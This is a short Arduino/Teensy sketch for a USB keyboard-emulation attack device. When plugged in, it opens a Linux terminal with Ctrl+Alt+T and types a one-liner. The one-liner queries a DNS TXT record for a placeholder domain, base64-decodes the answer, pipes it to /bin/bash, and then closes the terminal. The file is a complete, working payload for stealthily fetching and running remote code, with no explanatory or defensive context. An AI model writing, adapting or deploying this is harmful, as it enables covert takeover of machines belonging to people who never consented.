
void setup()
{
  delay(5000);
  terminal();
  delay(3000);
  Keyboard.print("nslookup -querytype=txt INPUT0 |");
  delay(100);
  Keyboard.print("grep text | cut -d \" \" -f3-");
  delay(100);
  Keyboard.print("|tr -d \"\\\"\" | base64 -d");
  delay(100);
  Keyboard.println(" | /bin/bash");
  delay(1000);
  Keyboard.println("exit");
  
}

void loop()
{
   
}

void terminal()
{
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();
  
  delay(100);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now(); 

}

